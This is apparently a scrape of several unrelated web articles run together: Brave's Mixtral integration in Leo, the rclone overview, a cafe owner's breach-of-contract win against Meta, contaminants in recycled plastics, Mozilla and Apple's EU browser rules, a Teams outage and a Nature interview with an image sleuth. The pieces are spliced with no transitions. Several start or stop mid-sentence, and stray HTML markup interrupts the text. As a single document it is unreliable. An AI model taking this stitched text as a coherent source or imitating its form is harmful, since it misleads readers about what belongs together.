<div id="readability-page-1" class="page"><section>
    <p>With today’s desktop browser update (v1.62), we are excited to announce that we have integrated Mixtral 8x7B as the default large language model (LLM) in <a href="https://brave.com/leo/">Leo</a>, our recently released, privacy-preserving AI browser assistant. <a href="https://mistral.ai/news/mixtral-of-experts/" target="_blank" rel="noopener">Mixtral 8x7B</a> is an open source LLM released by <a href="https://mistral.ai/" target="_blank" rel="noopener">Mistral AI</a> this past December, and has already seen broad usage due to its speed and performance. In addition, we’ve made several improvements to the Leo user experience, focusing on clearer onboarding, context controls, input and response formatting, and general UI polish.</p>

<h2 id="unveiling-mixtral-8x7b">Unveiling Mixtral 8x7B</h2>
<p>Mixtral is now the default LLM for all Leo users, for the free version and the Premium version ($15/month). The free version is rate limited, and subscribers to Leo Premium benefit from higher rate limits.&nbsp;</p>
<p>Mixtral 8x7B quickly gained popularity and usage among the developer community since its December release. Mixtral 8x7B currently outperforms ChatGPT 3.5, Claude Instant, Llama 2, and many others, according to the <a href="https://huggingface.co/spaces/lmsys/chatbot-arena-leaderboard" target="_blank" rel="noopener">LMSYS Chatbot Arena Leaderboard</a>. Mixtral also shows improvements in reducing hallucinations and biases, <a href="https://mistral.ai/news/mixtral-of-experts/" target="_blank" rel="noopener">according to the BBQ benchmark</a>.</p>
<p>Among other benefits, Mixtral can:</p>
<ul>
<li>Handle larger contexts</li>
<li>Interact in English, French, German, Italian, and Spanish</li>
<li>Generate code</li>
</ul>
<p>Brave is already using Mixtral for its newly released <a href="https://brave.com/codellm/">Code LLM</a> feature for programming-related queries in <a href="https://brave.com/search/">Brave Search</a>, and the combination of Mixtral’s performance with its open source nature made it a natural fit for integration in Leo, given Brave’s commitment to open models and the open source community.</p>
<p>“Since its release, Brave Leo has been adopted by tens of thousands of free tier users and paid subscribers, and we expect even greater adoption as we expand our availability of LLMs to include Mixtral,” said Brian Bondy, CTO and co-founder at Brave. “Our aim is to create novel and convenient use cases in the context of users’ browsing sessions, and to help our users interact with the Web in groundbreaking ways.”&nbsp;</p>
<p>“We are very happy to see Mixtral being used to power CodeLLM in Brave Search, and to now have Mixtral integrated in Brave Leo,” said Arthur Mensch, CEO at Mistral Al. “Making Mixtral available as an open model enables Brave to easily integrate it and to fulfill their users’ growing AI needs.”&nbsp;</p>

<h2 id="giving-leo-users-choice-with-a-variety-of-llms">Giving Leo users choice with a variety of LLMs</h2>
<p>Unlike other AI assistants, Brave Leo offers its users the flexibility to choose from different models according to their needs and budget. While we’ve added Mixtral 8x7B as the default LLM for both the free and premium versions of Brave Leo, we also offer Claude Instant from Anthropic in the free version (with rate limits) and for Premium. The free and premium versions of Leo also feature the Llama 2 13B model from Meta.</p>
<p>With Mixtral’s integration, Leo users will notice a significant performance improvement in the answer/result quality. Regarding the free Leo version, users will also have the option to revert to the previous Leo experience with Llama 2 and continue their AI experience once they reach the rate limits for Mixtral.</p>

<h2 id="privacy-always-comes-first">Privacy always comes first</h2>
<p>Privacy remains paramount for Brave Leo. Chats with Leo are private, anonymous, and secure. Leo doesn’t record chats, or use them for model training, and no account or login is required to use Leo. Privacy protections in Leo include:</p>
<ul>
<li><strong>Reverse proxy</strong>: All requests are proxied through an anonymization server so the request and user-address cannot be linked. Brave cannot associate the user request with their IP address.</li>
<li><strong>Immediate discarding of responses</strong>: Conversations are not persisted on Brave’s servers. Responses from Leo are discarded immediately after they’re generated, and not used for model training. We do not collect identifiers such as your IP Address that can be linked to you. No personal data is retained by the AI model or any 3rd-party model providers.</li>
<li><strong>No login or account required for access</strong>: Users do not need to create a Brave account to use Leo.&nbsp;</li>
<li><strong>Unlinkable subscription</strong>: If you sign up for Leo Premium, you’re issued unlinkable tokens that validate your subscription when using Leo. This means that Brave can never connect your purchase details with your usage of the product, an extra step that ensures your activity is private to you and only you. The email you used to create your account is unlinkable to your day-to-day use of Leo, making this a uniquely private credentialing experience.</li>
</ul>

<h2 id="ready-to-try-brave-leo">Ready to try Brave Leo?</h2>

<h2 id="about">About rclone</h2>
<p>Rclone is a command-line program to manage files on cloud storage. It
is a feature-rich alternative to cloud vendors' web storage
interfaces. <a href="#providers">Over 70 cloud storage products</a> support
rclone including S3 object stores, business &amp; consumer file storage
services, as well as standard transfer protocols.</p>
<p>Rclone has powerful cloud equivalents to the unix commands rsync, cp,
mv, mount, ls, ncdu, tree, rm, and cat. Rclone's familiar syntax
includes shell pipeline support, and <code>--dry-run</code> protection. It is
used at the command line, in scripts or via its <a href="https://rclone.org/rc">API</a>.</p>
<p>Users call rclone <em>"The Swiss army knife of cloud storage"</em>, and
<em>"Technology indistinguishable from magic"</em>.</p>
<p>Rclone really looks after your data. It preserves timestamps and
verifies checksums at all times. Transfers over limited bandwidth;
intermittent connections, or subject to quota can be restarted, from
the last good file transferred. You can
<a href="https://rclone.org/commands/rclone_check/">check</a> the integrity of your files. Where
possible, rclone employs server-side transfers to minimise local
bandwidth use and transfers from one provider to another without
using local disk.</p>
<p>Virtual backends wrap local and cloud file systems to apply
<a href="https://rclone.org/crypt/">encryption</a>,
<a href="https://rclone.org/compress/">compression</a>,
<a href="https://rclone.org/chunker/">chunking</a>,
<a href="https://rclone.org/hasher/">hashing</a> and
<a href="https://rclone.org/union/">joining</a>.</p>
<p>Rclone <a href="https://rclone.org/commands/rclone_mount/">mounts</a> any local, cloud or
virtual filesystem as a disk on Windows,
macOS, linux and FreeBSD, and also serves these over
<a href="https://rclone.org/commands/rclone_serve_sftp/">SFTP</a>,

<a href="https://rclone.org/commands/rclone_serve_ftp/">FTP</a> and
<a href="https://rclone.org/commands/rclone_serve_dlna/">DLNA</a>.</p>
<p>Rclone is mature, open-source software originally inspired by rsync
and written in <a href="https://golang.org/">Go</a>. The friendly support
community is familiar with varied use cases. Official Ubuntu, Debian,
Fedora, Brew and Chocolatey repos. include rclone. For the latest
version <a href="https://rclone.org/downloads/">downloading from rclone.org</a> is recommended.</p>
<p>Rclone is widely used on Linux, Windows and Mac. Third-party
developers create innovative backup, restore, GUI and business
process solutions using the rclone command line or API.</p>
<p>Rclone does the heavy lifting of communicating with cloud storage.</p>

Soldati was relieved when the Dover District Court finally released its decision Jan. 19.</p><p>“When I filed the initial small claim in 2018, I was in my 20s and now I’m not in my 20s, I had hair on my head and now I don’t have hair on my head,” Soldati said. “I just sort of feel like, how on earth did this take so long?”</p><media-image image-set="https://www.gannett-cdn.com/authoring/2020/03/10/NPOH/ghows-SO-f7b5646c-40a8-4a99-abfc-f09567afb0c5-0acaac9d.jpeg bestCrop, https://www.gannett-cdn.com/authoring/2020/03/10/NPOH/ghows-SO-f7b5646c-40a8-4a99-abfc-f09567afb0c5-0acaac9d.jpeg?crop=4021,3023,x5,y0 4:3, https://www.gannett-cdn.com/authoring/2020/03/10/NPOH/ghows-SO-f7b5646c-40a8-4a99-abfc-f09567afb0c5-0acaac9d.jpeg?crop=2268,3023,x882,y0 3:4, https://www.gannett-cdn.com/authoring/2020/03/10/NPOH/ghows-SO-f7b5646c-40a8-4a99-abfc-f09567afb0c5-0acaac9d.jpeg?crop=4031,2277,x0,y373 16:9" image-alt="" credit="Portsmouth Herald" caption="Emmett Soldati, owner of Teatotaller cafe, has won his case against Meta (formerly Facebook) over deleting the business's Instagram account, representing himself in court." orientation="horizontal" util-module-path="elements/media"></media-image><p>Soldati’s win wasn’t just a win for him, he said, but a win for all Instagram users and small business owners who have faced similar problems with the tech company.</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><partner-inline util-module-path="elements/partner" placement="native-article_link" sizes="[[300, 250], [3, 3]]" min-height="250" fluid="" outstream=""></partner-inline><h2>Why did Soldati file a claim against Facebook?</h2><p>Teatotaller, which has been described on Yelp as a “queer, hipster oasis of tea, coffee, and pastry goodness,” first opened in 2011 in Somersworth. It has since closed in Somersworth and now has locations in Dover and Concord. From the beginning, Soldati's business used Instagram heavily as a way to engage and find customers.</p><p>By 2018, Teatotaller had a large following to whom it promoted shows, specials, and other items. Soldati paid Instagram and Facebook for use of the professional platform.</p><partner-inline util-module-path="elements/partner" placement="native-article_link" sizes="[[300, 250], [3, 3]]" min-height="250" fluid="" outstream=""></partner-inline><cta-atoms-container-inline util-module-path="elements/cta"></cta-atoms-container-inline><p>When he first found himself unable to log in to his account in June 2018, he thought there was some kind of technical glitch.</p><p>“Over the course of 24 hours realizing it was deleted, I was very concerned,” Soldati said. All users could see when they tried to look at the account was a blank screen. “And so, you know, anyone might assume we don't exist anymore or we closed or whatnot and all of the shows and events and specials that we were just sort of planning to engage with our audience, we didn't have that line of communication.”</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="600" outstream="" momentum=""></partner-banner><p>Having no luck with Instagram's help support, he decided to file a small claim in the Dover District Court, thinking Facebook would “get the memo” and either give the account back or pay him a couple hundred bucks to repay him for lost revenue.&nbsp;</p><p><strong>“</strong>What was interesting is after I filed that claim, Facebook's response to it was so enormous and sort of so disproportionate to what I was, at the time, ultimately claiming: in their eyes, a relatively small account, small business owner just seeking a quick fix,” Soldati said. “And they sort of threw the book at me and had this massive memo and motion to dismiss that had like 10 points of why Facebook doesn't owe me anything. That was the moment that I realized that I had sort of struck some kind of nerve.”</p><h2>How did Soldati beat Facebook?</h2><p>Despite Facebook hiring several law firms to defend their case, Soldati, representing himself, was able to successfully argue Meta/Facebook committed a breach of contract and that they were not immune under the Communications Decency Act.</p><partner-inline util-module-path="elements/partner" placement="native-article_link" sizes="[[300, 250], [3, 3]]" min-height="250" fluid="" outstream=""></partner-inline><p>Soldati argued that by deleting his account with no explanation or warning, Meta had broken its contract set in the terms of service, and therefore was a breach of contract. In response, Meta claimed Soldati had accidentally deleted the account himself. But Soldati had screenshots from the day his account was deleted.</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><p>“The defendant provided two conflicting reasons for the deletion and was unable to specify a clear reason for the deletion,” read the court’s final order. “This court finds that the plaintiff has met their burden showing that they did not delete their own account.”</p><p>The court ruled in favor of Soldati that Facebook had committed a breach of contract.&nbsp;&nbsp;</p><p>Meta also argued it was immune to any cases brought against them under section 230 of the Communications Decency Act (CDA), which is often used to obtain immunity from claims involving the publishing or deletion of material on its platforms.</p><p>When Soldati originally filed his claim in the Dover District Court in 2018, it was dismissed under this section. But when he appealed it to the New Hampshire Supreme Court, they decided that Facebook was actually<a href="https://www.fosters.com/story/news/2020/07/24/teatotaller-gets-nh-supreme-court-win-over-facebook-instagram-which-deleted-cafersquos-account/113763892/"> not immune from liability</a> under the CDA. This win send the case back to the Dover District Court to issue a ruling on the small claim.</p><p>This time, the Dover District Court found Meta didn’t keep its promise to Teatotaller and deleted the account “without sufficient basis, and inconsistent with the reasons they have provided in the&nbsp;<em>Terms of Use.”</em></p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><p>The order ends, “Accordingly, the defendant is not entitled to immunity under the CDA.”&nbsp;</p><partner-inline util-module-path="elements/partner" placement="native-article_link" sizes="[[300, 250], [3, 3]]" min-height="250" fluid="" outstream=""></partner-inline><p>Meta’s motion to dismiss also included some other arguments Soldati calls “bogus.” It argued Instagram and Facebook (now Meta) aren’t the same company, but Facebook bought Instagram in 2012, six years before Soldati’s account was deleted. It also argued Meta doesn’t do any business in New Hampshire, but it markets and advertises to New Hampshire users. The company also argued Facebook is a free service which nobody pays for, but Soldati and other professional account owners do pay. These arguments ultimately failed.</p><h2>So why did Facebook delete Teatotaller’s account?</h2><p>Meta never gave an explanation for why it deleted Teatotaller's account.</p><p>While Teatotaller is known for supporting LGBTQ rights and has had&nbsp;<a href="https://www.fosters.com/story/news/2018/01/08/vandals-strike-somersworth-billboard/16354567007/">daring billboards promoting the business vandalized</a>, Soldati doesn’t think that was the reason for the deletion.</p><p>“It’s very possible that Facebook just screwed up,” Soldati said, but he thinks the company wouldn’t want to admit that.</p><p><strong>“</strong>If Facebook made a technological misstep that damaged the integrity of some of their users accounts, that's a credibility risk and it's a shareholder risk,” Soldati said. “And so I think a big aspect of this and why they shifted to trying to pretend that I deleted the account was because the true reason of its deletion could actually be something that undermines the promise that they claim to bring the users that, 'Hey, don't worry, as long as you follow the rules and don't post offensive material, whatever, you're good. And we're going to keep your account safe. We're going to keep your account active.'”</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><h2>What does this win mean for Soldati and other Facebook users?</h2><p>The District Court's ruling awarded Soldati $100 plus costs, and Soldati said the final amount is still pending. He said it will probably be just a few hundred dollars, maybe a few thousand dollars.</p><partner-inline util-module-path="elements/partner" placement="native-article_link" sizes="[[300, 250], [3, 3]]" min-height="250" fluid="" outstream=""></partner-inline><p>It’s nothing compared to the time he’s spent on the case, or what his business lost from the initial account deletion. To him, what’s more important is the repercussions of this decision.&nbsp;</p><p>The New Hampshire Supreme Court is now the highest court to have decided against Facebook’s CDA defense, according to Soldati.&nbsp;</p><p><strong>“</strong>I can be happy about the hundreds of dollars I put in my pocket. But ultimately, this will sort of stand as an example of like, they can't continue to throw the book at people and say, 'No, you don't have a claim here because we're immune,'” said Soldati. “Because now people can point to the New Hampshire Supreme Court and a small claims court in Dover, New Hampshire, and say here a judge found that you didn't pass the test.”</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><p>Soldati said he hopes courts start to see Meta as a monopoly. He initially filed his claim because there wasn’t another place for him to market his small business.</p><p>“It’s not like I can sell bubble tea on Twitter the way I can market it on a reel or a story or a post,” he said.&nbsp;</p><p>During the years-long course of the trial, he received lots of messages from people facing similar situations. A New York Times article reported many users had&nbsp;<a href="https://www.nytimes.com/2022/10/31/technology/instagram-accounts-suspended.html">their accounts deleted</a>&nbsp;in 2022. He hopes individual users can use this decision to gain power and leverage against the social media great.</p><p>“Atsome point some court has to review this and say, 'Maybe Facebook should not have as much power to completely dominate and control not only the social media landscape, but our court system,'” Soldati said.</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><partner-inline util-module-path="elements/partner" placement="native-article_link" sizes="[[300, 250], [3, 3]]" min-height="250" fluid="" outstream=""></partner-inline><p>In court, Soldati said Facebook attorneys were condescending and patronizing to him, but he took it seriously because it was his livelihood and because he thought that someone needed to fight them. He says it was “100%” worth it.&nbsp;</p><p>Gary Burt, a Manchester lawyer who represented Meta in the New Hampshire Supreme Court as well as the Dover District Court, did not immediately respond to a request to comment for this story.</p><lit-timestamp slot="timestamp" publishdate="2024-01-26 10:23:53 +0000 UTC" updatedate="2024-01-26 15:09:27 +0000 UTC"></lit-timestamp><p><a alt="Post the article to your Facebook Timeline" data-size="large" onclick="fireNavShareAnalytics('facebook');" rel="noopener" target="_blank"><svg view-box="0 0 24 24">

    <p>Plastic pollution is a menace worldwide. Plastics are now <a href="https://www.science.org/doi/10.1126/science.abg5433">found</a> in every <a href="https://pubs.acs.org/doi/10.1021/acs.est.1c04158">environment</a> on the planet, from the deepest seas to the atmosphere and human bodies. </p>

<p>Scientific evidence <a href="https://doi.org/10.5334/aogh.4056">describing harm</a> to the environment and humans is growing. Hence, the United Nations has <a href="https://wedocs.unep.org/bitstream/handle/20.500.11822/39812/OEWG_PP_1_INF_1_UNEA%20resolution.pdf">resolved</a> to <a href="https://enb.iisd.org/negotiations/international-legally-binding-instrument-plastics-pollution-including-marine#:%7E:text=The%20United%20Nations%20Environment%20Assembly,pollution%2C%20including%20in%20the%20marine">negotiate</a> a legally binding instrument to end plastic pollution.  </p>

<p>Strategies to achieve this goal include provisions throughout the plastics lifespan: production, use, waste management and remediation. </p>

<p>In designing rules for managing plastic, it’s important to understand that plastic materials and waste streams are complex. Not all plastics are the same. And recycled plastics are not necessarily “better” – less harmful – than virgin plastics. If they contained harmful chemicals to begin with, recycling doesn’t make them less harmful. And sometimes they are contaminated by other substances.</p>

<p>We conducted a <a href="https://www.sciencedirect.com/science/article/pii/S2352340923008090?via%3Dihub">study</a> identifying and measuring the concentration of contaminants in recycled pellets from 28 small-scale recycling facilities in the global south. Plastic waste is often exported from high income countries to less developed countries, with few to no requirements for reporting their makeup.</p>

<p>Our investigation covered facilities in Cameroon, Mauritius, Nigeria, Tanzania and Togo in Africa as well others in Asia, Europe and South America. </p>

<p>We found 191 pesticides, 107 pharmaceuticals and 81 industrial compounds among many others in the recycled plastic pellets. Many of these chemicals could be hazardous and make the plastics unsuitable for reuse.</p>

<p>This finding can inform regulations for recycled plastics. The chemical composition of the plastic should be checked before it is recycled. </p>

<h2>Chemicals used in production of plastics</h2>

<p>More than <a href="https://www.unep.org/resources/report/chemicals-plastics-technical-report">13,000 chemicals</a> are currently used in the production of plastic materials and products. They can include thousands of plastics additives – but also substances that are added unintentionally. Some unwanted chemicals form during the production or life of plastics. Thousands of these chemicals have dangerous properties. The health risks of some others are unknown. </p>

<p>Throughout the plastics value chain, during production, use, waste and recycling, other chemicals can contaminate the material too. The result may be recycled materials whose chemical composition is unknown. </p>

<p>Previous studies have reported the presence of <a href="https://doi.org/10.1016/j.jhazmat.2017.10.014">plastics additives</a> in recycled materials. Among them were chemicals that are <a href="https://www.unep.org/explore-topics/chemicals-waste/what-we-do/emerging-issues/endocrine-disrupting-chemicals">known</a> to have <a href="https://www.epa.gov/endocrine-disruption/overview-endocrine-disruption">negative effects on health</a>. Examples include <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0055387">phthalates</a> (plastic softeners), bisphenols like <a href="https://www.sciencedirect.com/science/article/pii/S0303720706002292">BPA</a>, and <a href="https://www.sciencedirect.com/science/article/pii/S0048969721044478?via%3Dihub">UV-stabilisers</a> used to protect plastics from sun damage and yellowing.</p>

<p>In our work, we established the presence of chemicals in recycled plastic that can cause harm to humans or other organisms. They include pesticides, pharmaceuticals and fragrances. Others are chemicals that result from burning natural materials, man-made organic chemicals used for industrial applications like paint, and ultraviolet filters.</p>

<p>We quantified a total of 491 different chemical substances. Some had specific uses and others formed from the breakdown of products.</p>

<p>Some national and regional policies <a href="https://www.basel.int/Implementation/Plasticwaste/Globalgovernance/tabid/8335/Default.aspx">regulate</a> the allowable concentration of hazardous chemicals in specific plastic products. But only 1% of plastics chemicals are subject to international regulation in existing multilateral environmental agreements. Policies don’t adequately address the issue of transparent reporting of chemicals in plastics across their value chain. Also, there are no laws to govern monitoring of chemicals in recycled materials. This is a <a href="https://www.science.org/doi/10.1126/science.adk9846">serious gap</a> in oversight. Stronger and more globally coordinated measures are necessary. </p>

<p>Our findings emphasise the importance of regulating mechanical recycling, as many of the substances measured were contaminants and not plastic additives. Many of the chemicals we identified may have contaminated the materials during use. For example, a jug used for storing pesticides will absorb some of the pesticides and will contaminate the recycling waste stream. Plastics in the environment are also known to absorb <a href="https://www.sciencedirect.com/science/article/pii/S0025326X11005960">organic pollutants</a>. </p>

<p>To assess the quality of recycled plastics, it’s crucial to know which chemicals are present and in what concentrations. This information can guide regulations about how recycled plastics may be used. It will also be valuable for plastics producers, waste management workers (including recyclers), consumers, and the scientific community.</p>

<h2>A path towards safer reuse of plastics</h2>

<p>To recycle more materials safely, several changes are necessary. These include:</p>

<ul>
<li><p>increased transparency regarding the use of chemicals and their risks </p></li>
<li><p>chemical simplification of the plastics market, so that fewer and less toxic chemicals are permitted for use</p></li>
<li><p>improved waste management infrastructure with separated waste streams  </p></li>
<li><p>improved recycling methods, including monitoring of hazardous chemicals.</p></li>
</ul>

<p>Chemical simplification of plastic additives will promote sustainability, safety and regulatory compliance. It will help manufacturers to minimise the environmental impact and adverse health effects of complex chemical formulations. Simpler chemical structures also improve the recycling potential of plastics and make recycling more efficient and cost-effective.</p>

<p><a href="https://pubs.acs.org/doi/full/10.1021/acs.est.1c04903">Chemical simplification</a> can also reduce potential health risks in the disposal of plastic materials. </p>

<p>From a regulatory perspective, chemical simplification supports clearer and more enforceable safety guidelines.</p>

<p>It’s is a crucial step towards the sustainable production and use of plastics, as  countries work towards a legal instrument to end pollution.</p>

<div id="readability-page-1" class="page"><div><p>Apple’s new rules in the European Union mean browsers like Firefox can finally use their own engines on iOS. Although this may seem like a welcome change, Mozilla spokesperson&nbsp;Damiano DeMonte tells <em>The Verge</em> it’s “extremely disappointed” with the way things turned out.</p><p>“We are still reviewing the technical details but are extremely disappointed with Apple’s proposed plan to restrict the newly-announced BrowserEngineKit to EU-specific apps,” DeMonte says. “The effect of this would be to force an independent browser like Firefox to build and maintain two separate browser implementations — a burden Apple themselves will not have to bear.”</p><p>In iOS 17.4, <a href="https://www.theverge.com/2024/1/25/24050478/apple-ios-17-4-browser-engines-eu">Apple will no longer force browsers</a> in the EU to use WebKit, the underlying engine that powers Safari. The change opens the door for other popular engines, such as Blink, which is used by Google Chrome and Microsoft Edge, as well as Gecko, the engine used by Firefox. It also means third-party browsers could become fully functional on iOS without any of the limitations that come along with WebKit. </p><p>Despite this, Mozilla argues that rolling out the changes only in the EU will make it more difficult for browsers to juggle different versions. “Apple’s proposals fail to give consumers viable choices by making it as painful as possible for others to provide competitive alternatives to Safari,” DeMonte adds. “This is another example of Apple creating barriers to prevent true browser competition on iOS.”</p><p>Mozilla isn’t the <a href="https://www.theverge.com/24051818/apple-app-store-dma-eu-developer-response">only developer critical of Apple’s new rules</a>, which also extend to game streaming apps, alternative app stores, and sideloading. Epic CEO Tim Sweeney called the new terms a “horror show,” while <a href="https://newsroom.spotify.com/2024-01-26/apples-proposed-changes-reject-the-goals-of-the-dma/">Spotify said the changes</a> are a “farce.” Apple’s guidelines are still pending approval by the EU Commission.</p></div></div>]]></description>

<p>Yesterday, <a href="https://9to5mac.com/2024/01/25/third-party-iphone-app-stores-ios-17-4/" target="_blank" rel="noreferrer noopener">Apple announced</a> some major changes to the App Store and the broader iPhone platform in the European Union, including support for alternative app marketplaces. There’s one piece of nuance that Apple is now clarifying.&nbsp;</p>



<p>Some of these changes are coming to all of Apple’s platforms, while others are coming <em>only</em> to the iPhone and not the iPad.</p>



<p>There is reason for this nuance. Apple explains that the European Union ruled that iOS is a gatekeeper platform as part of the Digital Markets Act. This applies only to iOS on the iPhone. iPadOS on the iPad is a completely different platform in the eyes of Apple and the European Commission.&nbsp;</p>



<p>On the other hand, the Digital Markets Act designates the entirety of the App Store as a gatekeeper service. In the eyes of the European Commission, this includes the App Store across all of Apple’s platforms: iPhone, iPad, Mac, Apple Watch, and Apple TV.</p>




	<p>With that in mind, Apple has bifurcated these changes based on the requirements of the DMA. Changes coming to the App Store are coming to all of Apple’s platforms, while changes to the iPhone are coming <em>only</em> to the iPhone, even if iOS shares a lot of the same codebase as iPadOS.</p>



<p>Here’s what that means in practice.</p>



<ul>
<li>The ability to install third-party app marketplaces and download apps from third-party app marketplaces will be an option <em>only</em> on the iPhone.</li>



<li>The new <a href="https://9to5mac.com/2024/01/26/apple-shares-more-details-about-the-new-default-web-browser-prompt-in-ios-17-4/" target="_blank" rel="noreferrer noopener">prompt in Safari</a> that asks users to pick a default browser engine is coming <em>only</em> to the iPhone.</li>



<li>Support for third-<a href="https://9to5mac.com/2024/01/25/third-party-default-browsers-engines/" target="_blank" rel="noreferrer noopener">party browser engines</a> is coming <em>only</em> to the iPhone.</li>



<li>The ability to set default NFC and wallet apps will <em>only</em> be available on the iPhone.</li>



<li>Changes to App Store policy to allow <a href="https://9to5mac.com/2024/01/25/apple-announces-reduced-commission-structure-for-apps-europe/" target="_blank" rel="noreferrer noopener">alternative payments and lower commissions</a> affect the App Store across all Apple platforms.</li>



<li>Changes to the App Store guidelines to allow <a href="https://9to5mac.com/2024/01/25/apple-game-streaming-app-store/" target="_blank" rel="noreferrer noopener">game streaming apps</a> impact all of Apple’s platforms.</li>
</ul>



<p>All of these changes are coming as part of iOS 17.4, which is <a href="https://9to5mac.com/2024/01/25/ios-17-4-beta-1-new-features/">currently available in developer beta testing</a>.</p>

Incredibly rough calculations would suggest the TPU v5p, therefore, is roughly between 3.4 and 4.8-times faster than the A100 – which makes it on par or superior to the H100, although more detailed benchmarking is needed before any conclusions can be drawn.</p><h3 id="section-more-from-techradar-pro"><span>More from TechRadar Pro</span></h3><ul><li><a href="https://www.techradar.com/computing/artificial-intelligence/what-is-google-gemini" data-before-rewrite-localise="https://www.techradar.com/computing/artificial-intelligence/what-is-google-gemini">What is Google Gemini?</a> Everything you need to know about Google’s next-gen AI</li><li>These are the <a href="https://www.techradar.com/news/computing-components/graphics-cards/best-graphics-cards-1291458" data-before-rewrite-localise="https://www.techradar.com/news/computing-components/graphics-cards/best-graphics-cards-1291458">best graphics cards</a> out there that you can buy</li><li><a href="https://www.techradar.com/news/computing-components/graphics-cards/amd-vs-nvidia-who-makes-the-best-graphics-cards-699480" data-before-rewrite-localise="https://www.techradar.com/news/computing-components/graphics-cards/amd-vs-nvidia-who-makes-the-best-graphics-cards-699480">AMD vs Nvidia</a>: who is the graphics card champion?</li></ul>

<p>Microsoft is investigating an ongoing and widespread outage impacting the users of its Teams communication platform and causing connectivity issues, login problems, and message delays.</p>
<p>While Redmond is still working on addressing these ongoing problems, it revealed that a networking issue might be the root cause of this outage.</p>
<p>"We've identified a networking issue impacting a portion of the Teams service and we're performing a failover to remediate impact. Additional information can be found under TM710344 in the admin center," <a href="https://twitter.com/MSFT365Status/status/1750931051210228178" target="_blank" rel="nofollow noopener">tweeted</a> the official Microsoft account for updates on Microsoft 365 service incidents.</p>
<p>Affected customers have reported login and server connection issues, desktop and mobile Teams apps freezing on the loading screen, and message delivery problems.</p>
<p>Other reports mention chat history not being available and images no longer displaying in chat, as well as being left in the waiting room after joining Teams meetings.</p>

<p>On impacted systems, customers see "We've run into a server error. Some functions might not work right now but you can continue to use the app" errors.</p>
<p>According to the&nbsp;TM710344 incident report in the Microsoft 365 admin center, the outage was first acknowledged by Redmond at&nbsp;10:37 AM EST and it&nbsp;impacts customers across&nbsp;North America, Europe, the Middle East, and Africa regions.</p>
<p>The outage affects users performing a cold boot, who may not be able to log into teams and will see an "oops" page. It also causes users attempting to log into their accounts and unlocking devices to see missing messages.</p>
<p>Other scenarios experienced by impacted customers can lead to:</p>
<ul><li>Users may fail to load messages in channels and chats</li>
<li>Users are unable to view or download their media (images, videos, audio, call recordings, code snippets)</li>
<li>Some messages may experience delays being sent</li>
<li>Call Recordings might take longer to appear in user's OneDrive for Business and SharePoint Online</li>
<li>Bots may be unable to download attachments</li>
<li>Sending and receiving read receipt notifications may be delayed</li>
</ul><p>"Our review of service telemetry indicates a portion of database infrastructure that facilitates multiple APls is experiencing a networking issue, resulting in impact," Microsoft said.</p>
<p>"We're continuing our investigation to isolate the underlying cause of the networking issue and develop remediation actions."</p>
<p><em>Update&nbsp;January 26, 12:55 EST: </em>Added&nbsp;TM710344 incident report&nbsp;info.</p>
<p><em>Update&nbsp;January 26, 13:28 EST:</em> Microsoft says it's working on addressing the server issues and is seeing signs of improvement.</p>
<p>"We've completed the failover in the EMEA region and service telemetry is showing some improvement. The failovers for the North and South America regions are ongoing and we continue to monitor," the company <a href="https://twitter.com/MSFT365Status/status/1750947382588571976" target="_blank" rel="nofollow noopener">tweeted</a>.</p>
<p><em>Update&nbsp;January 26, 14:21 EST: </em>Added details on more affected scenarios shared by Microsoft on the <a href="https://portal.office.com/servicestatus" target="_blank" rel="nofollow noopener">service health portal</a>.</p>

The news came after scientific-image sleuth Sholto David <a href="https://forbetterscience.com/2024/01/02/dana-farberications-at-harvard-university/" data-track="click" data-label="https://forbetterscience.com/2024/01/02/dana-farberications-at-harvard-university/" data-track-category="body text link">posted his concerns</a> about more than 50 manuscripts to a blog on 2 January.</p><p>In the papers, published in a range of journals including <i>Blood</i>, <i>Cell</i> and <i>Nature Immunology</i>, David found images from western blots — a common test for detecting proteins in biological samples — in which bands seemed to be spliced, stretched and copied and pasted. He also found images of mice duplicated across figures where they shouldn’t have been. (<i>Nature</i>’s news team is editorially independent of its publisher, Springer Nature, and of other Nature-branded journals.)</p><figure>

</figure><p>It was not the first time that some of these irregularities had been noted; some were flagged years ago on PubPeer, a website where researchers comment on and critique scientific papers. The student newspaper <i>The Harvard Crimson</i> <a href="https://www.thecrimson.com/article/2024/1/12/dana-farber-research-misconduct-allegations/" data-track="click" data-label="https://www.thecrimson.com/article/2024/1/12/dana-farber-research-misconduct-allegations/" data-track-category="body text link">reported on David’s findings</a> on 12 January.</p><p>The DFCI, an affiliate of Harvard University, had already been investigating some of the papers in question before David’s blogpost was published, says the centre’s research-integrity officer, Barrett Rollins. “Correcting the scientific record is a common practice of institutions with strong research-integrity processes,” he adds. (Rollins is a co-author of three of the papers that David flagged and is not involved in investigations into them, says DFCI spokesperson Ellen Berlin.) The DFCI is declining requests for interviews with its researchers about the retractions.</p><p>David, based in Pontypridd, UK, spoke to <i>Nature</i> about how he uncovered the data irregularities at the DFCI and what scientists can do to prevent mix-ups in their own work.</p><h2>You’ve said that you’re doing data sleuthing full-time. How did you get into it?</h2><p>I’m not doing anything else. I did my PhD in cellular molecular biology at Newcastle University [UK], and I finished that in 2019. And then I went to work for Oxford Biomedica [a UK gene- and cell-therapy company]. I was there for three years and then I moved out here to Wales. Since then, I’ve been doing this image stuff. I’m not doing this nine to five, but I am pretty busy with it.</p><p>I used to write letters to the editor [at journals], but it’s a very infuriating process. So, it’s through getting frustrated that I discovered PubPeer.</p><h2>You recently left your 2,000th comment on PubPeer. What keeps you coming back?</h2><p>I enjoy the ridiculous back and forth with the authors over e-mail. I care a lot about the animals [that are killed for life-sciences experiments] as well. The level of expectation we should have when we’re dealing with animals and high-profile institutions is that they’re super careful and that they get things right, so it’s frustrating when you see errors.</p><h2>What’s your usual process when you’re combing through a paper?</h2><p>It’s going to depend on the problem that I might expect to find. A few months ago, [the open-access journal] <a 